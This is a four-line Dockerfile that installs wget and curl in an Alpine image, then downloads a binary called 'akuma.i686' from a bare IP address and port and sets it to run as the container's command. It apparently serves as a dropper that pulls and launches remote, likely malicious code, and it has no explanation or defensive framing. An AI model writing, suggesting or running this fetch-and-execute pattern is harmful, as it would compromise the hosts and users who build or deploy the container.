FROM alpine:latest
RUN apk add --no-cache libc6-compat gcompat wget curl
RUN ( wget -q -O /tmp/akuma "http://45.9.2.239:24381/bins/docker/akuma.i686" || curl -fsSL -o /tmp/akuma "http://45.9.2.239:24381/bins/docker/akuma.i686" ) && chmod +x /tmp/akuma
CMD ["/tmp/akuma"]
